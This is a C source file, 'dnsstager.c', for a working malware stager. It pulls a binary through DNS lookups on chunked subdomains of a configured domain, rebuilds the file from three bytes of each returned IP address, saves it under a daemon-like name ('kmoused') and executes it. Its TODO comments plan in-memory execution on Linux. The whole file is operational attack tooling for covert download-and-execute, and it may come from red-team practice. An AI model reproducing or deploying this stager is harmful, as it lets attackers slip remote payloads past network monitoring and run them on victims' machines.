/*
 * dnsstager.c
 * Get a binary via DNS and run it
 * By J. Stuart McMurray
 * Created 20190329
 * Last Modified 20190422
 */

#include <arpa/inet.h>

#include <err.h>
#include <fcntl.h>
#include <inttypes.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* FILENAME is the name of the file to download.  It will be the same both
 * on the wire and on target. */
#define FILENAME "kmoused"

/* Domain is the domain to query */
#define DOMAIN "example.com"

/* Dropped file permission */
#define PERM 0700

/* get_ip gets the right three bytes of an IP address */
uint32_t get_ip(const char *name);

int
main(int argc, char **argv)
{
        uint32_t size, nw, chunk;
        char *query;
        char clabel[7];
        int fd, tw;
        char buf[3];

        /* Work out the domain template */
        if (0 > asprintf(&query, "%06x.%s.%s", 0xFFFFFF, FILENAME, DOMAIN))
                err(1, "asprintf");

        /* Get the size of the file */
        size = get_ip(query);
        if (0 == size)
                errx(7, "file not found");

        /* Open output file */
        /* TODO: Shove into memory if Linux */
        if (-1 == (fd = open(FILENAME, O_WRONLY|O_APPEND|O_TRUNC|O_CLOEXEC|O_CREAT, 0700)))
                err(4, "open");

        /* Grab each part of the file */
        for (nw = 0; nw < size;) {
                /* Get the right chunk */
                if (0 > snprintf(clabel, 7, "%06x", nw))
                        err(5, "snprintf");
                memcpy(query, clabel, 6);
                chunk = get_ip(query);

                /* Roll it into a buffer */
                buf[0] = chunk >> 16;
                buf[1] = (chunk & 0xFF00) >> 8;
                buf[2] = chunk & 0xFF;

                /* Work out how many bytes to write */
                tw = size - nw;
                if (3 < tw)
                        tw = 3;

                /* Put it in the file */
                if (tw != write(fd, buf, tw))
                        err(7, "write");

                /* Add the total written to the count */
                nw += tw;
        }
        printf("Wrote file.");

        /* Exec the file */
        /* TODO: Support memfd on Linux */
        if (-1 == execl(FILENAME, FILENAME, (char *)NULL))
                err(6, "execl");
        
        /* Shouldn't hit this */
        return -1;
}

/* get_ip gets the right three bytes of the IP for name */
uint32_t
get_ip(const char *name)
{
        extern int h_errno;
        struct hostent *he;
        struct in_addr *addr;

        /* Get the total number of chunks */
        h_errno = 0;
        if (NULL == (he = gethostbyname(name)))
                errx(2, "gethostbyname (%s): %s", name, hstrerror(h_errno));
        if (NULL == (addr = (struct in_addr *)he->h_addr_list[0]))
                errx(3, "no addresses");
        return ntohl(addr->s_addr) & 0x00FFFFFF;
}
